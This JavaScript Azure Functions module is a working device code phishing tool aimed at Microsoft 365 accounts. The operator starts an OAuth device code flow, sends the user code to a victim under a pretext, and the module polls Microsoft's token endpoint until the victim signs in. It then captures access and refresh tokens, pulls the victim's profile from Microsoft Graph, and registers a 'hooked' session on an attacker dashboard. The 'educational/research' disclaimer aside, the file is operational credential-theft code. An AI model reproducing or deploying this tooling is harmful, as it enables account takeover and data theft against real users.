/**
 * Device Code Phishing — Initiates Microsoft device code flows and polls for
 * victim authentication.
 *
 * The operator starts a flow, receives a user_code to deliver to the target
 * (via email, Teams, pretext, etc.), and the function polls Microsoft's token
 * endpoint in the background until the victim authenticates or the code expires.
 *
 * Routes:
 *   POST /devicecode/start          — Start a new device code flow
 *   GET  /devicecode/flows          — List active/completed flows
 *   POST /devicecode/flows/{id}/stop — Cancel a pending flow
 *
 * Integrates with dashboard.js for real-time notifications and session hooking.
 *
 * This code is provided for educational/research purposes only.
 */

const { app } = require("@azure/functions");
const crypto = require("crypto");
const { pushNotification, sessions } = require("./dashboard");

const CLIENT_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c";
const DEVICE_CODE_ENDPOINT = "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode";
const TOKEN_ENDPOINT = "https://login.microsoftonline.com/common/oauth2/v2.0/token";
const UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36";

const DASHBOARD_KEY = process.env.DASHBOARD_KEY || "";

function verifyDashboardKey(request) {
  if (!DASHBOARD_KEY) return false;
  const authHeader = request.headers.get("authorization") || "";
  const bearerToken = authHeader.startsWith("Bearer ") ? authHeader.slice(7) : "";
  if (bearerToken && safeCompare(bearerToken, DASHBOARD_KEY)) return true;
  const url = new URL(request.url);
  const keyParam = url.searchParams.get("key") || "";
  if (keyParam && safeCompare(keyParam, DASHBOARD_KEY)) return true;
  return false;
}

function safeCompare(a, b) {
  if (a.length !== b.length) return false;
  return crypto.timingSafeEqual(Buffer.from(a), Buffer.from(b));
}

function unauthorized() { return new Response("Unauthorized", { status: 401 }); }

// Active and completed device code flows
const flows = new Map();

// Clean up expired flows after 1 hour
setInterval(() => {
  const cutoff = Date.now() - 60 * 60 * 1000;
  for (const [id, flow] of flows) {
    if (flow.completedAt && flow.completedAt < cutoff) flows.delete(id);
    if (flow.expiresAt < cutoff) flows.delete(id);
  }
}, 60_000);

// Returns "pending", "slow_down", "captured", or "failed"
async function tryRedeemToken(flow, logFn) {
  const flowId = flow.id;
  const resp = await fetch(TOKEN_ENDPOINT, {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
      "User-Agent": UA,
    },
    body: new URLSearchParams({
      grant_type: "urn:ietf:params:oauth:grant-type:device_code",
      client_id: flow.clientId,
      device_code: flow.deviceCode,
    }).toString(),
  });

  const data = await resp.json();

  if (data.error === "authorization_pending") return "pending";
  if (data.error === "slow_down") return "slow_down";

  if (data.error) {
    flow.status = "failed";
    flow.error = data.error;
    flow.completedAt = Date.now();
    logFn(`Device code flow ${flowId}: failed — ${data.error}`);
    pushNotification("error",
      `<b>Device Code Failed</b><br><b>Flow:</b> ${flowId.substring(0, 8)}<br><b>Error:</b> ${data.error}`,
      { flowId }
    );
    return "failed";
  }

  if (data.access_token) {
    flow.status = "captured";
    flow.completedAt = Date.now();
    flow.accessToken = data.access_token;
    flow.refreshToken = data.refresh_token || null;

    logFn(`=== DEVICE CODE TOKENS CAPTURED === Flow: ${flowId}`);

    let userInfo = "unknown";
    let userClaims = {};
    if (data.id_token) {
      try {
        userClaims = JSON.parse(
          Buffer.from(data.id_token.split(".")[1], "base64url").toString("utf-8")
        );
        userInfo = userClaims.preferred_username || userClaims.upn || userClaims.email || "unknown";
      } catch (e) {}
    }

    try {
      const me = await fetch("https://graph.microsoft.com/v1.0/me", {
        headers: { "Authorization": "Bearer " + data.access_token, "User-Agent": UA },
      }).then(r => r.json());

      if (me.userPrincipalName) {
        userInfo = me.userPrincipalName;
        userClaims.name = me.displayName || userClaims.name;
        userClaims.jobTitle = me.jobTitle || null;
        userClaims.department = me.department || null;
        userClaims.tid = me.tid || userClaims.tid;
      }
    } catch (e) {
      logFn(`Graph /me enrichment failed: ${e.message}`);
    }

    flow.user = userInfo;

    pushNotification("tokens",
      `<b>DEVICE CODE TOKENS CAPTURED</b><br>` +
      `<b>User:</b> ${userInfo}<br>` +
      `<b>Refresh Token:</b> ${data.refresh_token ? "present" : "none"}<br>` +
      `<b>Scopes:</b> ${data.scope || "N/A"}`,
      { user: userInfo, flowId }
    );

    const sessionId = crypto.randomUUID();
    sessions.set(sessionId, {
      id: sessionId,
      capturedAt: Date.now(),
      lastTokenRefresh: Date.now(),
      status: "active",
      user: {
        upn: userInfo,
        name: userClaims.name || "unknown",
        tid: userClaims.tid || "unknown",
        jobTitle: userClaims.jobTitle || null,
        department: userClaims.department || null,
      },
      refreshToken: data.refresh_token || null,
      clientId: flow.clientId,
      resources: {},
      recon: {},
      credentials: {},
      cookieArray: [],
      captureMethod: "device_code",
    });

    flow.sessionId = sessionId;

    pushNotification("execution",
      `<b>SESSION HOOKED (Device Code)</b><br><b>User:</b> ${userInfo}<br><b>Session:</b> ${sessionId}`,
      { user: userInfo }
    );

    logFn(`Device code session hooked: ${sessionId} — user: ${userInfo}`);
    return "captured";
  }

  return "pending";
}

async function pollForToken(flowId, context) {
  const flow = flows.get(flowId);
  if (!flow) return;
  let interval = 5;

  while (flow.status === "pending" && Date.now() < flow.expiresAt) {
    await new Promise(r => setTimeout(r, interval * 1000));
    if (flow.status !== "pending") break;

    try {
      const result = await tryRedeemToken(flow, msg => context.log(msg));
      if (result === "slow_down") interval += 5;
      if (result === "captured" || result === "failed") return;
    } catch (err) {
      context.log(`Device code poll error: ${err.message}`);
    }
  }

  if (flow.status === "pending") {
    flow.status = "expired";
    flow.completedAt = Date.now();
    context.log(`Device code flow ${flowId}: expired`);
    pushNotification("info",
      `<b>Device Code Expired</b><br><b>Flow:</b> ${flowId.substring(0, 8)}<br><b>User Code:</b> ${flow.userCode}`,
      { flowId }
    );
  }
}

// POST /devicecode/start — initiate a new device code flow
app.http("devicecode-start", {
  methods: ["POST"],
  authLevel: "anonymous",
  route: "devicecode/start",
  handler: async (request, context) => {
    if (!verifyDashboardKey(request)) return unauthorized();

    let body = {};
    try { body = await request.json(); } catch (e) {}

    const clientId = body.client_id || CLIENT_ID;
    const scope = body.scope || "openid profile offline_access https://graph.microsoft.com/.default";

    context.log(`Starting device code flow — client_id: ${clientId}, scope: ${scope}`);

    const resp = await fetch(DEVICE_CODE_ENDPOINT, {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": UA,
      },
      body: new URLSearchParams({
        client_id: clientId,
        scope: scope,
      }).toString(),
    });

    const data = await resp.json();

    if (data.error) {
      context.log(`Device code request failed: ${data.error} — ${data.error_description}`);
      return new Response(JSON.stringify({ error: data.error, description: data.error_description }), {
        status: 400,
        headers: { "Content-Type": "application/json" },
      });
    }

    const flowId = crypto.randomUUID();
    const flow = {
      id: flowId,
      clientId: clientId,
      scope: scope,
      userCode: data.user_code,
      deviceCode: data.device_code,
      verificationUri: data.verification_uri,
      message: data.message,
      expiresAt: Date.now() + (data.expires_in * 1000),
      startedAt: Date.now(),
      status: "pending",
      completedAt: null,
      user: null,
      sessionId: null,
      error: null,
    };

    flows.set(flowId, flow);

    context.log(`Device code flow ${flowId}: user_code=${data.user_code}, expires_in=${data.expires_in}s`);

    pushNotification("info",
      `<b>Device Code Flow Started</b><br>` +
      `<b>User Code:</b> <code>${data.user_code}</code><br>` +
      `<b>URL:</b> <a href="${data.verification_uri}" target="_blank">${data.verification_uri}</a><br>` +
      `<b>Expires:</b> ${data.expires_in}s`,
      { flowId }
    );

    pollForToken(flowId, context)
      .catch(err => context.log(`Device code poll fatal error: ${err.message}`));

    return new Response(JSON.stringify({
      flowId: flowId,
      userCode: data.user_code,
      verificationUri: data.verification_uri,
      message: data.message,
      expiresIn: data.expires_in,
    }), {
      status: 200,
      headers: { "Content-Type": "application/json" },
    });
  },
});

// GET /devicecode/flows — list all flows; also kicks a token check for pending ones
app.http("devicecode-flows", {
  methods: ["GET"],
  authLevel: "anonymous",
  route: "devicecode/flows",
  handler: async (request, context) => {
    if (!verifyDashboardKey(request)) return unauthorized();

    // Opportunistic: try redeeming any pending flows on every dashboard poll.
    // This guarantees progress even if the background setTimeout loop is frozen.
    const pending = Array.from(flows.values()).filter(
      f => f.status === "pending" && Date.now() < f.expiresAt
    );
    await Promise.allSettled(
      pending.map(f => tryRedeemToken(f, msg => context.log(msg)).catch(() => {}))
    );

    const list = Array.from(flows.values()).map(f => ({
      id: f.id,
      userCode: f.userCode,
      verificationUri: f.verificationUri,
      status: f.status,
      startedAt: f.startedAt,
      expiresAt: f.expiresAt,
      completedAt: f.completedAt,
      user: f.user,
      sessionId: f.sessionId,
      error: f.error,
      clientId: f.clientId,
      scope: f.scope,
    })).sort((a, b) => b.startedAt - a.startedAt);

    return new Response(JSON.stringify(list), {
      status: 200,
      headers: { "Content-Type": "application/json" },
    });
  },
});

// POST /devicecode/flows/{id}/stop — cancel a pending flow
app.http("devicecode-stop", {
  methods: ["POST"],
  authLevel: "anonymous",
  route: "devicecode/flows/{id}/stop",
  handler: async (request) => {
    if (!verifyDashboardKey(request)) return unauthorized();

    const id = request.params.id;
    const flow = flows.get(id);
    if (!flow) return new Response("Not found", { status: 404 });

    if (flow.status === "pending") {
      flow.status = "cancelled";
      flow.completedAt = Date.now();
    }

    return new Response(JSON.stringify({ status: flow.status }), {
      status: 200,
      headers: { "Content-Type": "application/json" },
    });
  },
});
